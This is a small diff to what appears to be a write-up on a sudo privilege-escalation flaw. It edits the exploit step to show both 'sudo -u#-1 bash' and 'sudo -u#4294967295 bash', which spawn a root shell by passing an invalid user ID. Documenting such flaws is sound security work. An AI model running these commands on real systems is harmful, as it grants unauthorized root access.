@@ -39,7 +39,8 @@ The flaw can be exploited by an attacker to run commands as root by specifying t
 ```
 Run the below command as 
 ```
-sudo -u#-1 bash
+sudo -u#-1 bash 
+or,
 sudo -u#4294967295 bash 
 ```
 ## Didn't work, When i used /usr/bin/bash to execute eccept root
